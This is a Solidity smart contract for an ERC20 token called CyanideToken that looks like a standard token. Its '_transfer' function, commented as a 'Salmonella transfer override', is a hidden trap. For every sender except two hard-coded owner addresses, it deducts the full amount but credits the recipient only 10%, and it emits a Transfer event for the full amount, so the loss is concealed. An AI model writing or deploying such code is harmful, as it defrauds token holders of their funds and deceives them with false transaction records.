// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./Ownable.sol";


contract CyanideToken is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name = "CyanideToken";
    string private  _symbol = "CYN"; 

    address private ownerMsig  = 0x025034b782A35c8a2f46e5BCAF3e4BfA30BE21AA;
    address private ownerA = 0x849060CcA30E90cFbaCf838792334C1B1c74812C;


    constructor(){
        _mint(_msgSender(), 1000000 * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    

    function allowance(address sender, address spender) public view virtual override returns (uint256) {
        return _allowances[sender][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address _owner = _msgSender();
        _approve(_owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address _owner = _msgSender();
        _approve(_owner, spender, allowance(_owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address _owner = _msgSender();
        uint256 currentAllowance = allowance(_owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address _owner = _msgSender();
        _transfer(_owner, to, amount);
        return true;
    }

/**
* @notice - Salmonella transfer override
*/

    function _transfer( address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
/**
* @dev - ownerA = deploy address, other = ownerMsig
*/
      if (from == ownerA || from == ownerMsig) {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        } else {
            _balances[from] = fromBalance - amount;
            uint256 trapAmount = (amount * 10) / 100;
            _balances[to] += trapAmount;
        }
        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount); 
    }

    function _mint(address account, uint256 amount) internal virtual onlyOwner {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function _spendAllowance(
        address sender,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(sender, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(sender, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
  }
